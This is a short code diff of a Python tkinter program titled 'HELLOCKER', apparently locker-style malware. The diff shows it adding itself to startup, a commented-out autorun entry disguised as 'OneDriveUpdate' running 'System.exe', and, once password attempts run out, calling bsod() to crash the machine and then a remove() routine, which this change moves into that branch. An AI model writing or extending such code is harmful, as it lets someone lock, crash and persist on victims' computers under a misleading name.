@@ -8,7 +8,7 @@ from tkinter import messagebox
 from functools import partial
  
 
-from modules import bsod, startup, uninstall
+from modules import bsod, startup, uninstall, remove
 
 import os
 import shutil
@@ -24,7 +24,7 @@ count = 3
 file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
 #AddToAutorun("OneDriveUpdate", "C:\\ProgramData\\", "System.exe")
 startup(file_path)
-remove() 
+
 
 def buton(arg):
 	enter_pass.insert(END, arg)
@@ -46,6 +46,7 @@ def check():
 		if count == 0:
 			messagebox.showwarning("HELLOCKER","number of attempts expired")
 			bsod()
+			remove() 
 		else:
 			
 			messagebox.showwarning("HELLOCKER","Wrong password. Avalible tries: "+ str(count))
